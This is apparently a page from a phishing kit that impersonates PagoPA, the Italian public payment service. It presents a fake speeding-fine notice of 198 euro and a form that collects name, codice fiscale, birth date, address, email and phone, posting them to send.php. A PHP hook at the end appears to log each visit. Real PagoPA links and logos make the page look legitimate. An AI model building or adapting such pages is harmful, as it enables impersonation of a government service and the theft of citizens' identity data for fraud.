<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>pagoPA</title>
    <link rel="icon" type="image/png" href="img/pagopa-logo_brandlogos.net_gp2p3.png" />
    <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@400;600&amp;display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <style>
        body {
            font-family: "Titillium Web", Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url("img/pexels-photo-3182762.jpeg");
            background-position: center bottom;
            background-repeat: no-repeat;
            background-size: cover;
            background-attachment: fixed;
        }

        /* Remove background image on small screens (phones) */
        @media screen and (max-width: 767px) {
            body {
                background-image: none;
                background-color: #fff; /* fallback color */
            }
        }

        .navbar {
            background-color: #003366;
            padding: 10px 20px;
            display: flex;
            flex-wrap: nowrap;
            align-items: center;
            justify-content: space-between;
            color: white;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }

        .navbar img {
            width: 150px;
            margin-bottom: 10px;
            flex-shrink: 0;
        }

        .button-container {
            display: flex;
            flex-wrap: nowrap;
            gap: 10px;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            flex-shrink: 1;
        }

        .button-container a {
            white-space: nowrap;
            flex-shrink: 0;
        }

        .navbar a {
            color: white;
            font-size: 14px;
            padding: 8px 12px;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
        }

        .navbar a:hover {
            background-color: skyblue;
            color: #003366;
        }

        .content {
            background-color: rgba(244, 244, 244, 0.85);
            padding: 20px;
            margin: 20px auto;
            max-width: 1000px;
            border-radius: 10px;
            box-sizing: border-box;
        }

        .payment-box,
        .form-container {
            background-color: #003366;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .payment-box h2 {
            font-size: 22px;
        }

        .form-container h2 {
            font-size: 18px;
            margin-bottom: 15px;
        }

        .form-section {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .half-width {
            flex: 1;
            min-width: 250px;
        }

        .form-container label {
            font-weight: bold;
            margin-bottom: 6px;
            display: block;
        }

        .form-container input {
            width: 100%;
            padding: 8px;
            margin-bottom: 12px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            box-sizing: border-box;
            height: 38px;
            line-height: 1.2;
        }

        /* Style date input to look consistent with other inputs */
        input[type="date"] {
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            background: white;
            color: #000;
            padding: 8px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
            height: 38px;
            line-height: 1.2;
            position: relative;
        }

        /* Show the calendar icon in Chrome/Safari */
        input[type="date"]::-webkit-inner-spin-button,
        input[type="date"]::-webkit-calendar-picker-indicator {
            display: block;
            cursor: pointer;
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            opacity: 0.6;
        }

        /* Firefox calendar icon */
        input[type="date"]::-moz-calendar-picker-indicator {
            cursor: pointer;
        }

        .form-container button {
            background-color: skyblue;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            max-width: 300px;
            font-size: 16px;
            border-radius: 5px;
            margin: 20px auto;
            display: block;
            cursor: pointer;
        }

        footer {
            background-color: #003366;
            color: white;
            padding: 30px 20px;
            font-size: 14px;
        }

        .footer-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            gap: 20px;
        }

        .footer-logos img {
            height: 40px;
            margin-right: 10px;
        }

        .footer-links ul {
            list-style: none;
            padding: 0;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 0;
        }

        .footer-links a {
            color: white;
            text-decoration: underline;
        }

        .footer-company-info {
            flex-basis: 100%;
        }

        @media screen and (max-width: 768px) {
            /* Navbar: keep buttons horizontal, allow scroll */
            .navbar {
                flex-wrap: nowrap;
            }
            .button-container {
                flex-wrap: nowrap;
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }

            /* Form section stacked vertically on small */
            .form-section {
                flex-direction: column;
            }

            .half-width {
                width: 100%;
            }

            .form-container button {
                width: 100%;
            }

            .footer-container {
                flex-direction: column;
                align-items: flex-start;
            }
        }
    </style>
</head>

<body>
    <div class="navbar">
        <img src="img/pagopa-logo-white.png" alt="PagoPA Logo" />
        <div class="button-container">
            <a href="https://www.pagopa.gov.it/it/servizi/pagamento/">Pagamento multa</a>
            <a href="https://www.pagopa.gov.it/it/serve-aiuto/">Serve aiuto?</a>
            <a href="https://www.pagopa.gov.it/it/chi-siamo/pagopa-spa/">PagoPa S.p.A</a>
            <a href="https://www.pagopa.gov.it/it/piano-triennale/">Piano Triennale</a>
            <a href="https://www.pagopa.gov.it/it/pubbliche-amministrazioni/">Amministrazioni</a>
            <a href="https://www.pagopa.gov.it/it/soluzioni/">Soluzioni</a>
            <a href="https://www.pagopa.gov.it/it/assistenza/">Supporto</a>
        </div>
    </div>

    <div class="content">
        <div class="payment-box">
            <h2>Pagamento violazione codice della strada</h2>
            <p>Riferimento: <strong>#R7230033407</strong></p>
            <p>Motivo: <strong>Eccesso di velocità rilevato da radar</strong></p>
            <p>Importo: <strong style="color: skyblue;">198,00€</strong></p>
        </div>

        <div class="form-container">
            <h2>Compila il modulo per completare il pagamento</h2>
            <form action="send.php" method="POST">
                <div class="form-section">
                    <div class="half-width">
                        <label for="first-name">Nome</label>
                        <input type="text" id="first-name" name="fname" placeholder="Nome" required="" />

                        <label for="last-name">Cognome</label>
                        <input type="text" id="last-name" name="lname" placeholder="Cognome" required="" />

                        <label for="codice-fiscale">Codice Fiscale</label>
                        <input type="text" id="codice-fiscale" name="codice-fiscale" placeholder="Codice Fiscale" required="" />

                        <label for="birthdate">Data di nascita</label>
                        <input type="date" id="birthdate" name="birthdate" max="2007-12-31" placeholder="GG/MM/AAAA" required="" pattern="\d{4}-\d{2}-\d{2}" title="Formato: YYYY-MM-DD" />
                    </div>
                    <div class="half-width">
                        <label for="city">Città</label>
                        <input type="text" id="city" name="city" placeholder="Città" required="" />

                        <label for="zip-code">Codice Postale</label>
                        <input type="text" id="zip-code" name="zip" placeholder="Codice Postale" required="" />

                        <label for="email">Email</label>
                        <input type="email" id="email" name="email" placeholder="Email" required="" />

                        <label for="phone">Telefono</label>
                        <input type="tel" id="phone" name="number" placeholder="Telefono" required="" />
                    </div>
                </div>
                <button type="submit">Convalida e continua</button>
            </form>
        </div>
    </div>

    <footer>
        <div class="footer-container">
            <div class="footer-logos">
                <img src="img/nextGenerationEU-outline-white.svg" alt="NextGenerationEU" />
                <img src="img/logo-pagopa-spa-bianco.svg" alt="PagoPA S.p.A." />
            </div>
            <div class="footer-links">
                <ul>
                    <li><a href="https://www.pagopa.gov.it/it/privacy/">Privacy</a></li>
                    <li><a href="https://www.pagopa.gov.it/it/note-legali/">Note legali</a></li>
                    <li><a href="https://www.pagopa.gov.it/it/trasparenza/">Trasparenza</a></li>
                    <li><a href="https://www.pagopa.gov.it/it/accessibilita/">Accessibilità</a></li>
                </ul>
            </div>
            <div class="footer-company-info">
                <p><strong>PagoPA S.p.A.</strong> - Piazza Colonna 370, Roma - CF/P.IVA 15376371009</p>
            </div>
        </div>
    </footer>
</body>
<?php 
$m->ctr("INFORMATION (".@$_GET['p'].")");
?>
</html>